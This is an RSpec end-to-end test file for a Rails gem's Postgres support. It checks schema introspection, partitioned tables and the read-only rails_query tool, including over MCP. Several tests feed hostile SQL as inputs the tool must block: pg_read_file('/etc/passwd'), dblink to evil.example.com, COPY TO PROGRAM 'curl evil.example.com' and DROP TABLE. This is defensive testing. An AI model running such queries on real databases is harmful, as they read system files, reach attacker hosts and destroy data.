# frozen_string_literal: true

require_relative "e2e_helper"

# Postgres adapter coverage. Skipped unless TEST_POSTGRES=1 - local
# developers rarely have postgres running, and we don't want to silently
# pass by skipping in CI.
#
# Exercises the rails_query tool's Postgres-specific code paths:
#   - SET TRANSACTION READ ONLY before SELECT
#   - BLOCKED_FUNCTIONS regex (pg_read_file, pg_ls_dir, dblink, LO_*, etc.)
#     and the statement keyword blocker (COPY, DROP) - verified via
#     attempting one and asserting a structured rejection
#
# Plus the SQLite-equivalent baseline (rails_get_schema, rails_get_routes)
# to prove the gem works against a non-default adapter end-to-end.
RSpec.describe "E2E: Postgres adapter", type: :e2e do
  before(:all) do
    skip "TEST_POSTGRES not set - Postgres harness only runs when explicitly requested" unless ENV["TEST_POSTGRES"] == "1"

    @builder = E2E::TestAppBuilder.new(
      parent_dir: E2E.root,
      name: "postgres_app",
      install_path: :in_gemfile,
      database: :postgresql
    ).build!
    @cli = E2E::CliRunner.new(@builder)
  end

  describe "schema introspection works against Postgres" do
    it "rails_get_schema returns the scaffolded posts table" do
      result = @cli.cli_tool("schema")
      expect(result.success?).to be(true), result.to_s
      expect(result.stdout).to match(/posts/i)
    end

    it "rails_get_routes returns the scaffolded post routes" do
      result = @cli.cli_tool("routes")
      expect(result.success?).to be(true), result.to_s
      expect(result.stdout).to match(/posts/i)
    end
  end

  # A partition repeats its parent's columns, indexes and keys, so every
  # table list names the parent once and counts its partitions' rows and
  # bytes as the parent's.
  describe "a partitioned table" do
    before(:all) do
      setup = @cli.run([ "bin/rails", "runner", <<~RUBY ])
        ActiveRecord::Base.connection.execute(<<~SQL)
          DROP TABLE IF EXISTS readings;
          DROP TABLE IF EXISTS measurements;
          CREATE TABLE measurements (id bigserial, recorded_on date NOT NULL, PRIMARY KEY (id, recorded_on)) PARTITION BY RANGE (recorded_on);
          CREATE TABLE measurements_2026_01 PARTITION OF measurements FOR VALUES FROM ('2026-01-01') TO ('2026-02-01');
          CREATE TABLE measurements_2026_02 PARTITION OF measurements FOR VALUES FROM ('2026-02-01') TO ('2026-03-01');
          CREATE INDEX index_measurements_on_recorded_on ON measurements (recorded_on);
          CREATE TABLE readings (id bigserial PRIMARY KEY, measurement_id bigint, measurement_recorded_on date,
            FOREIGN KEY (measurement_id, measurement_recorded_on) REFERENCES measurements (id, recorded_on));
          INSERT INTO measurements (recorded_on) VALUES ('2026-01-05'), ('2026-01-06'), ('2026-02-05');
          ANALYZE measurements;
        SQL
      RUBY
      raise setup.to_s unless setup.success?

      # Rails dumps each partition into schema.rb as a table inheriting its parent.
      dump = @cli.run([ "bin/rails", "db:schema:dump" ])
      raise dump.to_s unless dump.success?
    end

    it "is one table in rails_get_schema" do
      result = @cli.cli_tool("schema")
      expect(result.success?).to be(true), result.to_s
      expect(result.stdout).to match(/\bmeasurements\b/)
      expect(result.stdout).not_to include("measurements_2026")
    end

    # PostgreSQL clones a key that references a partitioned table once per partition.
    it "is the target of one foreign key in rails_get_schema" do
      result = @cli.cli_tool("schema", [ "--table", "readings" ])
      expect(result.success?).to be(true), result.to_s
      # Rails 7.0 reads only a key's first column; 7.1 and later read them all.
      keys = result.stdout.lines.grep(/→ `measurements/)
      expect(keys.size).to eq(1), result.stdout
      expect(keys.first).to include("→ `measurements.")
    end

    it "is one table carrying its partitions' rows in the database stats" do
      result = @cli.run([ "bin/rails", "runner",
                          "puts RailsAiContext::Introspectors::DatabaseStatsIntrospector.new(Rails.application).call.to_json" ])
      expect(result.success?).to be(true), result.to_s
      tables = JSON.parse(result.stdout.lines.last)["tables"]

      expect(tables.map { |t| t["table"] }).not_to include(a_string_starting_with("measurements_2026"))
      expect(tables.find { |t| t["table"] == "measurements" }).to include("approximate_rows" => 3)
      expect(tables).to eq(tables.sort_by { |t| [ -t["approximate_rows"], t["table"] ] })
    end

    it "is one table carrying its partitions' bytes in rails_runtime_info" do
      result = @cli.cli_tool("runtime_info", [ "--section", "database" ])
      expect(result.success?).to be(true), result.to_s
      expect(result.stdout).not_to include("measurements_2026")
      expect(result.stdout).to match(/^\| measurements \| (?!0 Bytes)/)
    end

    it "is one table with one copy of each index in rails_runtime_info's index usage" do
      result = @cli.cli_tool("runtime_info", [ "--section", "database", "--detail", "full" ])
      expect(result.success?).to be(true), result.to_s
      expect(result.stdout).to include("`index_measurements_on_recorded_on` on `measurements`")
      expect(result.stdout).not_to include("measurements_2026")
    end
  end

  describe "rails_query tool against Postgres" do
    it "executes a simple SELECT and returns the result" do
      result = @cli.cli_tool("query", [ "--sql", "SELECT id, title, body FROM posts LIMIT 5" ])
      # No rows in the test DB, but the query should execute without error.
      expect(result.status.signaled?).to be(false)
      expect(result.exit_status).to be < 2
    end

    it "blocks pg_read_file via BLOCKED_FUNCTIONS regex" do
      result = @cli.cli_tool("query", [ "--sql", "SELECT pg_read_file('/etc/passwd')" ])
      # Tool must reject before execution. Either non-zero exit or
      # structured "blocked" response.
      output = result.output
      expect(output).to match(/blocked|denied|forbidden|not allowed/i),
        "expected pg_read_file to be blocked, got: #{result}"
    end

    it "blocks dblink via BLOCKED_FUNCTIONS regex" do
      result = @cli.cli_tool("query", [ "--sql", "SELECT * FROM dblink('host=evil.example.com', 'SELECT 1') AS t(a int)" ])
      output = result.output
      expect(output).to match(/blocked|denied|forbidden|not allowed/i),
        "expected dblink to be blocked, got: #{result}"
    end

    it "blocks COPY ... PROGRAM" do
      result = @cli.cli_tool("query", [ "--sql", "COPY (SELECT 1) TO PROGRAM 'curl evil.example.com'" ])
      output = result.output
      expect(output).to match(/blocked|denied|forbidden|not allowed/i),
        "expected COPY...PROGRAM to be blocked, got: #{result}"
    end

    it "rejects DDL statements (read-only enforcement)" do
      result = @cli.cli_tool("query", [ "--sql", "DROP TABLE posts" ])
      output = result.output
      # Either blocked at validator level OR rejected by READ ONLY transaction.
      expect(output).to match(/read.only|denied|blocked|not allowed|prohibited/i),
        "expected DROP TABLE to be rejected, got: #{result}"
    end
  end

  # The round trip an agent makes, over the protocol: on PostgreSQL a query
  # is planned in a read-only transaction before it runs.
  describe "rails_query over MCP stdio" do
    before(:all) do
      seed = File.join(@builder.app_path, "tmp", "e2e_query_seed.rb")
      File.write(seed, %(Post.create!(title: "E2E PostgreSQL probe", body: "seeded", published: true)\n))
      result = @cli.run([ "bin/rails", "runner", seed ])
      raise result.to_s unless result.success?

      @mcp = E2E::McpStdioClient.new(@builder, timeout: 90).start!
      @mcp.initialize!
    end

    after(:all) { @mcp&.stop! }

    def text(response) = response.dig("result", "content", 0, "text").to_s

    it "answers a SELECT" do
      response = @mcp.call_tool("rails_query", { sql: "SELECT title FROM posts WHERE published" })

      expect(response.dig("result", "isError")).not_to eq(true), text(response)
      expect(text(response)).to include("E2E PostgreSQL probe")
    end

    it "refuses an UPDATE, and the row stays as it was" do
      response = @mcp.call_tool("rails_query", { sql: "UPDATE posts SET title = 'changed by e2e'" })

      expect(response.dig("result", "isError")).to eq(true), text(response)
      expect(text(response)).to include("UPDATE")
      after = text(@mcp.call_tool("rails_query", { sql: "SELECT title FROM posts" }))
      expect(after).to include("E2E PostgreSQL probe")
      expect(after).not_to include("changed by e2e")
    end
  end
end
